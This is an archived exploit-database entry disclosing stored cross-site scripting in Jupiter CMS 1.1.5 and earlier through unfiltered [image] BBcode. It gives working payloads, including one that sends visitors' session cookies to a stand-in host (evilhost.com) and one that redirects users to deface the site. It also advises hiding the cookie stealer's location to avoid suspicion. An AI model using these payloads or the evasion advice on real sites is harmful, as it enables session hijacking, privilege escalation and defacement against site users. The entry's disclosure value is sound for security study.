  "code": "Jupiter CMS <= 1.1.5 multiple XSS attack vectors.\r\n\r\nDiscovered by: Nomenumbra/[0x4F4C] Date: 3/11/2006 impact:high (privilege escalation,site defacement)\r\n\r\nJupiter CMS (http://www.highstrike.net/) is a dynamic CMS system like mambo or limbo, allowing users\r\nto subscribe and posts events. Because no filtering is done upon [image] BBcode input, any user is\r\ncapable of inserting arbitrary javascript code, allowing for credential theft leading/session\r\nhijacking and possibly site defacement.\r\n\r\nExamples:\r\n\r\nThis would make a messagebox pop up saying 'XSS', whenever the events get loaded (on the main page,\r\ncalender,etc): [image=javascript:alert('XSS')]\r\n\r\nThis would allow an attacker to steal session ID's, which he could insert into his own cookie to\r\nhijack sessions and elevate his/her privileges:\r\n\r\n[image=javascript:window.navigate('http://www.evilhost.com/cookiestealer.php?c='+document.cookie)]\r\n\r\nIt would be used with SjaakRake's cookie stealer (http://www.milw0rm.com/exploits/1103), with maybe\r\nthe addition of a header(\"location: \".<anythinghere>), to redirect the user to a page of your choice,\r\nto avoid suspicion and disclosure of your cookiestealer's location.\r\n\r\nThis injections would allow an attacker to redirect users to a page of his choice, effectively\r\ndefacing the page:\r\n\r\n[image=javascript:window.navigate('http://www.evilhost.com/pwned.html')]\r\n\r\nAs you can see the possibilities are limitless, as long as you have a bit of fantasy!\r\n\r\nNomenumbra/[0x4F4C]\r\n\r\nQuestions: zerogue@gmail.com Site: http://0x4f4c.awardspace.com\r\n\r\n# milw0rm.com [2006-03-11]",
